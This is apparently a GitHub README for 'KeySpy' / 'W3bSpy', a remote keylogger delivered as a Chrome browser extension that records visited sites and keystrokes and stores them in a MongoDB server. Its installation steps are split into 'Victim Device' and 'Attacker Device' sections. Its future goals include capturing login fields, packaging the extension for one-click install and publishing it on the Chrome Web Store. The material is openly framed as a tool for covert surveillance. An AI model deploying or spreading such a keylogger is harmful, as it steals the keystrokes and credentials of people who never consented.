<p align="center"><a href="https://github.com/3rr0r-505/KeySpy"><img alt="" src="https://github.com/3rr0r-505/KeySpy/blob/main/img/KeySpy-cover.png?raw=true"  height="50%" width="100%"/></a></p>

<p align="center"> 
<a href="https://nodejs.org/en"><img alt="" src="https://img.shields.io/badge/JavaScript-Latest-yellow?logo=javascript&logoColor=yellow"/></a>
&nbsp;
<a href="https://nodejs.org/en"><img alt="" src="https://img.shields.io/badge/Node.js-v16.4.0-339933?logo=node.js"/></a>
&nbsp;
<a href="https://nodejs.org/en"><img alt="" src="https://img.shields.io/badge/Mongoose-v5.13.12-brown?logo=mongoose&logoColor=brown"/></a>
&nbsp;
<a href="https://nodejs.org/en"><img alt="" src="https://img.shields.io/badge/Express-v4.17.1-929292?logo=express&logoColor=white"/></a>
&nbsp;
<a href="https://www.mongodb.com/"><img alt="" src="https://img.shields.io/badge/MongoDB%20Atlas-v4.4.6-009441?logo=mongodb&logoColor=009441"/></a>
&nbsp;
<a href="https://www.microsoft.com/en-us/windows?r=1"><img alt="" src="https://img.shields.io/badge/OS-Windows-brighten?logo=windows&label=OS&labelColor=grey&color=blue"/></a><br>
</p>

# KeySpy - Remote Keylogger Tool

KeySpy is a simple Python keylogger with a web interface for viewing captured keystrokes in real-time.

## W3bSpy - Browser Extension of KeySpy

A Browser Extension to detect the site and key strokes, store the data in mongoDB server.

<!--## Features

- Captures keystrokes in the background while running.
- Stores captured keystrokes in a `keylogs.txt` file.
- Displays captured keystrokes in a web interface using Flask.
- Automatically starts the keylogger and web interface upon running the `weblogger.py` script.
- Allows viewing keystrokes from multiple sessions.-->

## Installation
### Victim Device:
  - Load the extension into Chrome:-
      - Open Google Chrome and go to chrome://extensions/.
      - Enable Developer Mode by toggling the switch in the top right corner.
      - Click on the "Load unpacked" button and select the W3bSpy-Client directory.
### Attacker Device :
   - Setting up the server:
      - Install dependencies and start the server:
        ```bash
           cd KeySpy/W3bSpy/W3bSpy-Server
           npm install express mongoose
           node server.js
## Future Goals
- Goal 1:
  - **Name:** Replace Server.js
  - **Description:** Use separate server or mongoDB Realm to run server.js 24/7.

- Goal 2:
  - **Name:** Improve UI
  - **Description:** use html file for improved UI of the extension.

- Goal 3:
  - **Name:** Field Detection
  - **Description:** Detect the fields of the sites and show in output; eg. `http://test.com [TimeStamp]> username: FakeUser`.

- Goal 4:
  - **Name:** CRX file
  - **Description:** create a crx file & host it to just click n install the extension.

- Goal 5:
  - **Name:** Add to Chrome Web Store 
  - **Description:** Add the extension to chrome web store to add it in the browser quickly and easily.
